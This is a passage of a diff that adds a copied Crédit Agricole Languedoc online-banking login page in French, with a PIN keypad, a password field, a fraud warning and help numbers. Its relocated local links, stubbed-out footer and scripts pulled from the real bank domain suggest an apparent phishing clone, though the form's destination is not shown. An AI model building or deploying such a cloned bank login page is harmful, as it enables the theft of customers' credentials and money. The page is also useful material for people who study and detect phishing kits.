+    		Votre identification est incorrecte, veuillez ressaisir votre code d'accès
+    	</p>
+	</div>
+        
+	<div class="row row-no-padding">
+		<div class="col-xs-12">
+		
+			<button 
+				tabindex="0" 
+				type="button" 
+				aria-label="Validation du code personnel" 
+				class="btn btn-primary col-xs-12 Login-button" 
+				login-submit-btn 
+				disabled
+			>
+					Entrer mon code personnel
+			</button>
+
+		</div>
+	</div>
+
+	<div id="clavier_num" style="display:none">
+		<div class="row row-no-padding">
+			<div class="col-xs-12">
+				<div class="Login-keypad">
+					<a href="acceder-a-mes-comptes.html#" class="Login-key T031__key" tabindex="0" role="button" onclick="saisieLecteurEcran()"></a>
+					<a href="acceder-a-mes-comptes.html#" class="Login-key T031__key" tabindex="0" role="button" onclick="saisieLecteurEcran()"></a>
+					<a href="acceder-a-mes-comptes.html#" class="Login-key T031__key" tabindex="0" role="button" onclick="saisieLecteurEcran()"></a>
+					<a href="acceder-a-mes-comptes.html#" class="Login-key T031__key" tabindex="0" role="button" onclick="saisieLecteurEcran()"></a>
+					<a href="acceder-a-mes-comptes.html#" class="Login-key T031__key" tabindex="0" role="button" onclick="saisieLecteurEcran()"></a>
+				</div>
+			</div>
+		</div>
+		<div class="row row-no-padding">
+			<div class="col-xs-12">
+				<div class="Login-keypad">
+					<a href="acceder-a-mes-comptes.html#" class="Login-key T031__key" tabindex="0" role="button" onclick="saisieLecteurEcran()"></a>
+					<a href="acceder-a-mes-comptes.html#" class="Login-key T031__key" tabindex="0" role="button" onclick="saisieLecteurEcran()"></a>
+					<a href="acceder-a-mes-comptes.html#" class="Login-key T031__key" tabindex="0" role="button" onclick="saisieLecteurEcran()"></a>
+					<a href="acceder-a-mes-comptes.html#" class="Login-key T031__key" tabindex="0" role="button" onclick="saisieLecteurEcran()"></a>
+					<a href="acceder-a-mes-comptes.html#" class="Login-key T031__key" tabindex="0" role="button" onclick="saisieLecteurEcran()"></a>
+				</div>
+			</div>
+		</div>
+	</div>
+	
+	<div class="row row-no-padding">
+		<div class="col-xs-12">
+	    	<input value="Valider" id="validation" aria-label="Validation du code personnel" type="submit" class="btn btn-primary Login-button col-xs-12" style="display:none" disabled/>
+	    </div>
+	</div> -->
+
+													<div class="row row-no-padding">
+														<div class="col-xs-12">
+															<input value="Valider" id="validation"
+																aria-label="Validation du code personnel" type="submit"
+																class="btn btn-primary Login-button col-xs-12"
+																 disabled="" tabindex="2000">
+														</div>
+													</div>
+
+
+
+													<div class="register parsys">
+														<div class="texte section">
+
+
+
+
+
+															<div tabindex="0">
+																<p style="text-align: center;"><span class="h3">Vous
+																		n’êtes pas encore client&nbsp;?</span></p>
+
+															</div>
+														</div>
+														<div class="texte section">
+
+
+
+
+
+															<div tabindex="0">
+																<p style="text-align: center;"><span class="h2"><span
+																			class="h3">Vous souhaitez devenir client
+																			?</span></span></p>
+
+															</div>
+														</div>
+														<div class="bouton-generique parbase section">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+															<div class="GenericBtn GenericBtn--full">
+
+
+																<a href="https://www.credit-agricole.fr/ca-languedoc/particulier/ouvrir-un-compte.html"
+																	class="GenericBtn-btn" target="_self">
+																	<span>Devenir client</span>
+																</a>
+
+															</div>
+
+														</div>
+
+													</div>
+
+
+												</form>
+
+												<script>
+													function saisieLecteurEcran() {
+
+														var input = document.getElementById('j_password').value.length;
+														var msg = document.getElementById('passwordmessage');
+
+														if (input == 0) {
+															msg.innerHTML = 'Premier chiffre saisi';
+														}
+														if (input == 1) {
+															msg.innerHTML = 'Deuxième chiffre saisi';
+														}
+														if (input == 3) {
+															msg.innerHTML = 'Troisième chiffre saisi';
+														}
+														if (input == 5) {
+															msg.innerHTML = 'Quatrième chiffre saisi';
+														}
+														if (input == 7) {
+															msg.innerHTML = 'Cinquième chiffre saisi';
+														}
+														if (input == 9) {
+															msg.innerHTML = 'Sixième chiffre saisi';
+														}
+													}
+												</script>
+											</div>
+
+										</div>
+
+
+										<div class="col-xs-12 col-sm-6">
+											<div class="Login-information">
+												<div class="infos texte">
+
+
+
+
+
+													<div tabindex="0">
+														<p><span class="RichText-legal"><span
+																	class="defaultSpan"><b>ALERTE
+																		SÉCURITÉ&nbsp;:&nbsp;DES CLIENTS DU CRÉDIT
+																		AGRICOLE REÇOIVENT ACTUELLEMENT DES EMAILS OU
+																		DES APPELS TÉLÉPHONIQUES FRAUDULEUX DE PERSONNES
+																		SE FAISANT PASSER POUR DES AGENTS DU CRÉDIT
+																		AGRICOLE.</b></span></span></p>
+														<p><span class="RichText-legal">Le Crédit Agricole ne demandera
+																jamais à ses clients la communication des données
+																confidentielles (code d'accès aux comptes en ligne...)
+																pour annuler une ou plusieurs opérations.</span></p>
+														<p><span class="RichText-legal">En cas de doute, et avant
+																d'agir, rapprochez-vous immédiatement de votre agence ou
+																du service SOS cartes (09 69 39 92 91/prix d'un appel
+																local 7j/7 et 24h/24).</span><br>
+														</p>
+														<h2>&nbsp;</h2>
+														<h2><span class="lead"><b>VOTRE IDENTIFICATION NE CHANGE
+																	PAS</b></span><b><u><br>
+																</u></b></h2>
+														<p><span class="RichText-texteVignettes"><b>Pour accéder à votre
+																	compte, saisissez votre identifiant et votre code
+																	personnel habituels.</b></span></p>
+														<p><span class="RichText-texteVignettes">Retrouvez votre
+																identifiant ou&nbsp;&nbsp;numéro de compte à 11 chiffres
+																sur&nbsp; :</span></p>
+														<p><span class="RichText-texteVignettes">- Les RIB/IBAN de votre
+																chéquier,<br>
+																- Vos relevés de compte (format papier),<br>
+																- L'application Ma Banque.</span></p>
+														<p><a title="Mot de passe oublié"
+																href="https://www.credit-agricole.fr/ca-languedoc/particulier/form-demande-mot-de-passe.html"><span
+																	class="RichText-texteVignettes">Mot de passe
+																	oublié</span></a></p>
+														<p><span class="RichText-texteVignettes"><a
+																	href="https://www.credit-agricole.fr/ca-languedoc/particulier/informations/tutos-banque-en-ligne.html">Consultez
+																	nos tutos</a></span><span class="testClass"><br>
+															</span></p>
+														<p><span class="lead"><b>UN BESOIN D'ASSISTANCE</b></span><br>
+														</p>
+														<p><b style="font-size: 0.8125rem;"><span
+																	class="RichText-texteVignettes"><b>Contactez-nous au
+																		04 27 84 15 10</b> (prix d'un appel non
+																	surtaxé).&nbsp;Ce service est disponible du lundi au
+																	vendredi de 8h30 à 19h et le samedi de 8h30 à
+																	16h.</span></b></p>
+														<p><b style="font-size: 0.8125rem;"><b><span
+																		class="RichText-texteVignettes">En dehors de ces
+																		plages horaires, veuillez utiliser ce numéro 09
+																		69 39 92 91 (prix d'un appel
+																		local).</span></b></b></p>
+														<p><span class="lead"><b><br>
+																	SÉCURITÉ<br>
+																</b></span><span class="RichText-texteVignettes">Restez
+																vigilants et veillez à protéger vos données
+																personnelles.<br>
+																<a href="https://www.credit-agricole.fr/ca-languedoc/particulier/cybersecurite.html"
+																	target="_blank"
+																	title="Conseils de sécurité (nouvel onglet)">Consultez
+																	nos conseils de sécurité</a></span></p>
+														<p>&nbsp;</p>
+														<p><span class="lead"><b>UN PROBLÈME TECHNIQUE<br>
+																</b></span><b></b><a
+																href="mailto:bam.cael@ca-languedoc.fr"><span
+																	class="RichText-texteVignettes">Signalez-nous un
+																	problème</span></a></p>
+														<p><span class="RichText-texteVignettes">Nous vous invitons
+																également à consulter régulièrement nos Conditions
+																Générales d'utilisation.<br>
+															</span><b style="font-size: 0.8125rem;"><span
+																	class="RichText-texteVignettes"><a
+																		href="https://www.credit-agricole.fr/ca-languedoc/particulier/informations/mentions-legales.html"
+																		title="Mentions légales (même onglet)">Voir les
+																		Conditions Générales
+																		d'Utilisation</a></span></b></p>
+
+													</div>
+												</div>
+
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+
+
+	</main>
+
+
+	<!-- <footer>
+		
+	    <div class="Footer">
+			
+
+
+
+
+
+
+
+
+<div class="LowFooterMention">     
+  		<div class="LowFooterMention-BlocLinks">
+		
+        	<div class="footer-mentions parbase">
+
+
+
+
+
+
+
+
+
+
+	
+	    <div class="dropup LowFooterMention-FlagDropup footer-mention-display-disconnected hidden">
+	        <button class="btn dropdown-toggle LowFooterMention-FlagDropupBtn" type="button" id="dropdownMenu2" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+	            <img src="/etc/designs/ca/npc/clientlib-resources/images/commun/france_flag.png" class="LowFooterMention-MainFlagImg" alt="" />
+	            <span class="caret LowFooterMention-BtnTriangleMenu"></span>
+	        </button>
+	        <ul class="dropdown-menu dropdown-menu-left LowFooterMention-FlagDropupUl" aria-labelledby="dropdownMenu2">
+	            <li><span class="MidFooterLink-TriangleForFlagBubble"></span></li>
+	            <li class="LowFooterMention-FlagDropupList">
+	                
+	                	
+                        <a href="/content/ca/cr835/npc/en/.changelangue.html" class="LowFooterMention-FlagDropupListLink">
+	                        <img src="/etc/designs/ca/npc/clientlib-resources/images/commun/uk_flag.png" class="LowFooterMention-FlagImg" alt="" />
+	                    </a>
+	                
+	                	
+                        <a href="/content/ca/cr835/npc/it/.changelangue.html" class="LowFooterMention-FlagDropupListLink">
+	                        <img src="/etc/designs/ca/npc/clientlib-resources/images/commun/italy_flag.png" class="LowFooterMention-FlagImg" alt="" />
+	                    </a>
+	                
+	                	
+                        <a href="/content/ca/cr835/npc/fr/particulier.changelangue.html" class="LowFooterMention-FlagDropupListLink">
+	                        <img src="/etc/designs/ca/npc/clientlib-resources/images/commun/france_flag.png" class="LowFooterMention-FlagImg" alt="" />
+	                    </a>
+	                
+	                	
+                        <a href="/content/ca/cr835/npc/es/.changelangue.html" class="LowFooterMention-FlagDropupListLink">
+	                        <img src="/etc/designs/ca/npc/clientlib-resources/images/commun/spain_flag.png" class="LowFooterMention-FlagImg" alt="" />
+	                    </a>
+	                
+	                	
+                        <a href="/content/ca/cr835/npc/ca/.changelangue.html" class="LowFooterMention-FlagDropupListLink">
+	                        <img src="/etc/designs/ca/npc/clientlib-resources/images/commun/spain_flag.png" class="LowFooterMention-FlagImg" alt="" />
+	                    </a>
+	                
+	            </li>
+	        </ul>
+	    </div>
+    
+
+
+
+
+
+
+
+
+
+<a href="#" class="LowFooterMention-Links LowFooterMention-FirstLink" target="_self">
+	<div class="label1 texteSimple">
+
+
+
+
+
+
+<div>
+    Mentions Légales
+</div></div>
+
+</a>
+<a href="#" class="LowFooterMention-Links" target="_self">
+	<div class="label2 texteSimple">
+
+
+
+
+
+
+<div>
+    Politique de cookies et de protection des données
+</div></div>
+
+</a>
+<a href="#" class="LowFooterMention-Links" target="_self">
+	<div class="label3 texteSimple">
+
+
+
+
+
+
+<div>
+    Conformité
+</div></div>
+
+</a>
+<a href="#" class="LowFooterMention-Links" target="_self">
+	<div class="label4 texteSimple">
+
+
+
+
+
+
+<div>
+    Sécurité
+</div></div>
+
+</a>
+
+	
+	
+		<a href="#" class="LowFooterMention-Links" target="_self">
+			<div class="label5 texteSimple">
+
+
+
+
+
+
+<div>
+    Plan du site
+</div></div>
+
+		</a>
+	
+
+
+
+	
+	
+		<span class="LowFooterMention-Links">© Crédit Agricole</span>
+	
+
+</div>
+
+        
+    </div>
+</div>
+
+	    </div>
+	</footer>	 -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+	<script type="text/javascript"
+		src="https://www.credit-agricole.fr/etc/designs/ca/npc/clientlib-general.min.df6619a7651b4fb345f95db09ab2abf5.js"></script>
+
+	<script type="text/javascript"
+		src="https://www.credit-agricole.fr/etc/designs/ca/npc/clientlibPageErreur.min.5ec3c0e06d67e4010c6b6fac52711d82.js"></script>
+
+	<script type="text/javascript"
+		src="https://www.credit-agricole.fr/etc/designs/ca/npc/clientlibMireAuthentification.min.98ad36028111fa140a4bfdaeb590e35d.js"></script>
+
+	<!-- <div class="modal-backdrop fade in"></div>
+
+	<div id="cookieDisabledModal" class="modal fade Modal in" role="dialog" tabindex="28" style="display: block;">
+		<div class="Modal-dialog">
+			<div class="Modal-content">
+				<div class="Modal-header"></div>
+				<div class="Modal-body" role="alertdialog" aria-modal="true" tabindex="29">
+					<p class="text-justify">Malheureusement, votre configuration de navigation actuelle ne vous permet
+						pas de naviguer dans de bonnes conditions. Vous ne pourrez pas profiter de toutes les
+						fonctionnalités de notre site ni accéder à votre espace client. Nous vous invitons à vérifier
+						les configurations de votre navigateur afin de permettre aux cookies techniques du site d'être
+						acceptés.</p>
+				</div>
+			</div>
+		</div>
+	</div>
+
+	<div class="modal-backdrop fade in"></div> -->
+
+</body>
+
+</html>
